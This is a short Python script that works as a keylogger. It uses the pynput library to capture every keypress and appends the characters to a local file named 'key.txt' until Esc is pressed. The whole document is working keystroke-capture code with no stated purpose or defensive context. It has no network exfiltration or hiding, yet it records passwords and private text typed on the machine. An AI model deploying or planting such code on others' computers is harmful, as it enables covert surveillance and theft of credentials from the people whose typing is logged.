from pynput import keyboard

with open("key.txt", "w") as f:
	pass

def on_press(key):
	try:
		if key == keyboard.Key.space:
			# print("space")
			loggy = " "
		elif key == keyboard.Key.enter:
			loggy = "\n"
		elif key == keyboard.Key.tab:
			loggy = "\t"
		else:
			loggy = str(key.char)
		with open("key.txt", "a") as f:
			f.write(loggy)
	except AttributeError:
		print(f'Special key {key} pressed')

def on_release(key):
	if key == keyboard.Key.esc:
		return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
